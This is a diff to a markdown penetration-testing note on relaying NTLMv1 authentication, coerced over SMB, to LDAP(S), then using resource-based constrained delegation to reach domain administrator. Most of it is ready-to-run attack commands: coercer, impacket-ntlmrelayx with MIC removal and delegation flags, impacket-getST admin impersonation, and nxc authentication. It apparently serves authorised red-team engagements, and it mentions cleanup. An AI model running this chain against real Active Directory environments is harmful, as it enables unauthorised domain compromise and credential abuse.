@@ -6,6 +6,8 @@
 
 Its not possible to relay SMB connections to LDAP(S) unless the Message Integrity Code (MIC) is removed. As NTLMv1 does not support the MIC it is therefor possible to relay NTLMv1 coerced from SMB to LDAP(S)
 
+___
+
 ### Requirements
 
 - At least two Domain Controllers in the target Domain
@@ -24,28 +26,13 @@ Its not possible to relay SMB connections to LDAP(S) unless the Message Integrit
 - MAQ Greater than 0
 - Account to impersonate not in "Protected Users" or "Sensitive and cant be delegated"
 
-#### Attack Chain (MAQ -> RBCD -> Domain Administrator)
+#### Owned Computer -> RBCD -> Domain Administrator
 
-> Coerce
-```bash
-coercer coerce -u "USERNAME" -p "PASSWORD" -d "DOMAIN" -t "TARGET" -l "LISTENER"
-```
-> Relay
-```
-impacket-ntlmrelayx -t ldap://TARGET --remove-mic -smb2support --delegate-access
-```
-> RBCD
-```bash
-impacket-getST DOMAIN/'MACHINE$':'PASSWORD' -impersonate "ADMIN" -spn "SERVICE/TARGET FQDN" -dc-ip "DC IP"
-```
-> Authentication
-```bash
-nxc smb "TARGET" --use-kcache 
-```
-
-#### Attack Chain (Owned Computer -> RBCD -> Domain Administrator)
-- Have authentication material for an owned computer ```MACHINE$```
+- Credential material for owned machine account
 - Account to impersonate not in "Protected Users" or "Sensitive and cant be delegated"
+
+___
+#### Attack Chain
 
 > Coerce
 ```bash
@@ -53,6 +40,10 @@ coercer coerce -u "USERNAME" -p "PASSWORD" -d "DOMAIN" -t "TARGET" -l "LISTENER"
 ```
 > Relay
 ```python
+# if MAQ -gt 0
+impacket-ntlmrelayx -t ldap://TARGET --remove-mic -smb2support --delegate-access --no-dump --no-da --no-acl
+
+# if using Owned Computer
 impacket-ntlmrelayx -t ldap://TARGET --remove-mic -smb2support --delegate-access --escalate-user "MACHINE$" --delegate-access --no-dump --no-da --no-acl
 ```
 > RBCD
@@ -63,8 +54,7 @@ impacket-getST DOMAIN/'MACHINE$':'PASSWORD' -impersonate "ADMIN" -spn "SERVICE/T
 ```bash
 nxc smb "TARGET" --use-kcache 
 ```
-
-
+___
 #### Cleanup
 
 - The system we coerce from has the ```msDs-AllowedToActOnBehalfOfOtherIdentity``` attribute modified to the created machine account. Ensure this is removed on engagements.
